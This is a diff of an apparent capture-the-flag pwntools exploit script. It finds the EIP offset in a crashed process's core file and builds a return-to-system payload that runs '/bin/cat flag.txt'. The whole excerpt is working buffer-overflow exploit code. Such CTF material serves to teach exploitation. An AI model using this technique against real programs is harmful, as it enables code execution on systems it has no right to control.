@@ -54,22 +54,17 @@ io.wait()
 # Open up the corefile
 core = io.corefile
 
-# Print out the address of ESP at the time of crashing
-esp_value = core.esp
-esp_offset = cyclic_find(esp_value)
-info('located ESP offset at {a}'.format(a=esp_offset))
-
 # Print out the address of EIP at the time of crashing
 eip_value = core.eip
 eip_offset = cyclic_find(eip_value)
 info('located EIP offset at {a}'.format(a=eip_offset))
 
-# Craft a new payload which puts the "target" address at the correct offset
-payload = flat(
-    asm('nop') * eip_offset,
-    elf.symbols.system,
-    0x0,
-    bincat_addr
+# Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
+payload = fit({
+    eip_offset: [elf.symbols.system,
+                 0x0,
+                 bincat_addr]
+}
 )
 
 # Send the payload to a new copy of the process
